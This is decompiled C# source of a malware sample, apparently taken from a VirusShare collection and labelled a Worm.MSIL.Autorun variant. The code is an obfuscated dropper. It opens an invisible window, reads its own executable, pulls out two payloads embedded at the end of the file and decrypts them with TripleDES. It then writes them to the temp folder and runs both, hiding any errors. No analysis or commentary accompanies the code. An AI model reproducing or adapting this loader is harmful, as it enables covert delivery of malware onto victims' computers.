// Decompiled with JetBrains decompiler
// Type: .
// Assembly: bnd, Version=3.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C234D78C-A583-40D7-9C29-57926676923E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Autorun.jm-f154dac96ddbbc8bcec1e52217b7df5406350bc4ae81141c4961837839367139.exe

using \u008D;
using \u0095;
using \u0099;
using \u009D;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0095
{
  [DesignerGenerated]
  public class \u0094 : Form
  {
    private IContainer \u0092;
    private int \u0093;
    private int \u0094;
    private int \u0095;
    private int \u0096;
    private int \u0097;
    private int \u0098;
    private string \u0099;
    private string \u009A;
    private byte[] \u009B;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0094()
    {
      \u009C.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.Shown += new EventHandler(this.\u0089);
      this.\u0087();
    }

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.\u0092 == null)
          return;
        this.\u0092.Dispose();
      }
      finally
      {
        base.Dispose(obj0);
      }
    }

    [DebuggerStepThrough]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u0087()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.ControlBox = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = \u0098.\u0087(190);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = \u0098.\u0087(200);
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u0088([In] int obj0)
    {
      DateTime dateTime = DateTime.Now.AddSeconds((double) obj0);
      TimeSpan timeSpan;
      do
      {
        timeSpan = dateTime.Subtract(DateTime.Now);
        Application.DoEvents();
        Thread.Sleep(100);
      }
      while (timeSpan.TotalSeconds > 0.0);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u0089([In] object obj0, [In] EventArgs obj1)
    {
      try
      {
        this.\u0088(5);
        this.\u009B = \u008C.\u0088.FileSystem.ReadAllBytes(Application.ExecutablePath);
        this.\u0093 = int.Parse(this.\u008A());
        this.\u0095 = int.Parse(this.\u008B());
        this.\u0096 = int.Parse(this.\u008C());
        this.\u0097 = int.Parse(this.\u008D());
        this.\u0099 = this.\u008E();
        this.\u009A = this.\u008F();
        byte[] data1 = this.\u0090();
        byte[] data2 = this.\u0091();
        \u008C.\u0088.FileSystem.WriteAllBytes(Path.GetTempPath() + this.\u0099, data1, false);
        \u008C.\u0088.FileSystem.WriteAllBytes(Path.GetTempPath() + this.\u009A, data2, false);
        this.\u0088(3);
        Process process = new Process();
        process.StartInfo.FileName = Path.GetTempPath() + this.\u0099;
        process.Start();
        this.\u0088(3);
        process.StartInfo.FileName = Path.GetTempPath() + this.\u009A;
        process.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Application.Exit();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string \u008A()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        int num1 = checked (this.\u009B.Length - 8);
        int num2 = checked (this.\u009B.Length - 1);
        int index = num1;
        while (index <= num2)
        {
          str2 += Conversions.ToString(Strings.ChrW((int) this.\u009B[index]));
          checked { ++index; }
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = (string) null;
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string \u008B()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        int num1 = checked (this.\u009B.Length - 16);
        int num2 = checked (this.\u009B.Length - 9);
        int index = num1;
        while (index <= num2)
        {
          str2 += Conversions.ToString(Strings.ChrW((int) this.\u009B[index]));
          checked { ++index; }
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = (string) null;
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string \u008C()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        int num1 = checked (this.\u009B.Length - 24);
        int num2 = checked (this.\u009B.Length - 17);
        int index = num1;
        while (index <= num2)
        {
          str2 += Conversions.ToString(Strings.ChrW((int) this.\u009B[index]));
          checked { ++index; }
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = (string) null;
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string \u008D()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        int num1 = checked (this.\u009B.Length - 32);
        int num2 = checked (this.\u009B.Length - 25);
        int index = num1;
        while (index <= num2)
        {
          str2 += Conversions.ToString(Strings.ChrW((int) this.\u009B[index]));
          checked { ++index; }
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = (string) null;
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string \u008E()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        int num1 = checked (this.\u009B.Length - 32 + this.\u0093);
        int num2 = checked (this.\u009B.Length - 33);
        int index = num1;
        while (index <= num2)
        {
          str2 += Conversions.ToString(Strings.ChrW((int) this.\u009B[index]));
          checked { ++index; }
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = (string) null;
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string \u008F()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        int num1 = checked (this.\u009B.Length - 32 + this.\u0093 + this.\u0095);
        int num2 = checked (this.\u009B.Length - 33 + this.\u0093);
        int index = num1;
        while (index <= num2)
        {
          str2 += Conversions.ToString(Strings.ChrW((int) this.\u009B[index]));
          checked { ++index; }
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = (string) null;
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] \u0090()
    {
      byte[] numArray1;
      try
      {
        int index1 = 0;
        byte[] numArray2 = new byte[checked (this.\u0096 - 1 + 1)];
        int num1 = checked (this.\u009B.Length - 32 + this.\u0093 + this.\u0095 + this.\u0096);
        int num2 = checked (this.\u009B.Length - 33 + this.\u0093 + this.\u0095);
        int index2 = num1;
        while (index2 <= num2)
        {
          numArray2[index1] = this.\u009B[index2];
          checked { ++index1; }
          checked { ++index2; }
        }
        numArray1 = \u0094.\u0096.\u0088(numArray2, \u0098.\u0087(210));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray1 = (byte[]) null;
        ProjectData.ClearProjectError();
      }
      return numArray1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] \u0091()
    {
      byte[] numArray1;
      try
      {
        int index1 = 0;
        byte[] numArray2 = new byte[checked (this.\u0097 - 1 + 1)];
        int num1 = checked (this.\u009B.Length - 32 + this.\u0093 + this.\u0095 + this.\u0096 + this.\u0097);
        int num2 = checked (this.\u009B.Length - 33 + this.\u0093 + this.\u0095 + this.\u0096);
        int index2 = num1;
        while (index2 <= num2)
        {
          numArray2[index1] = this.\u009B[index2];
          checked { ++index1; }
          checked { ++index2; }
        }
        numArray1 = \u0094.\u0096.\u0088(numArray2, \u0098.\u0087(240));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray1 = (byte[]) null;
        ProjectData.ClearProjectError();
      }
      return numArray1;
    }

    public class \u0096
    {
      private static TripleDESCryptoServiceProvider \u0089;
      private static MD5CryptoServiceProvider \u008A;

      [MethodImpl(MethodImplOptions.NoInlining)]
      static \u0096()
      {
        \u009C.SLV0fFIsptsZtjvFft17();
        \u0094.\u0096.\u0089 = new TripleDESCryptoServiceProvider();
        \u0094.\u0096.\u008A = new MD5CryptoServiceProvider();
      }

      [DebuggerNonUserCode]
      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0096()
      {
        \u009C.SLV0fFIsptsZtjvFft17();
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public static byte[] \u0087([In] string obj0) => \u0094.\u0096.\u008A.ComputeHash(Encoding.ASCII.GetBytes(obj0));

      [MethodImpl(MethodImplOptions.NoInlining)]
      public static byte[] \u0088([In] byte[] obj0, [In] string obj1)
      {
        \u0094.\u0096.\u0089.Key = \u0094.\u0096.\u0087(obj1);
        \u0094.\u0096.\u0089.Mode = CipherMode.ECB;
        return \u0094.\u0096.\u0089.CreateDecryptor().TransformFinalBlock(obj0, 0, obj0.Length);
      }
    }
  }
}
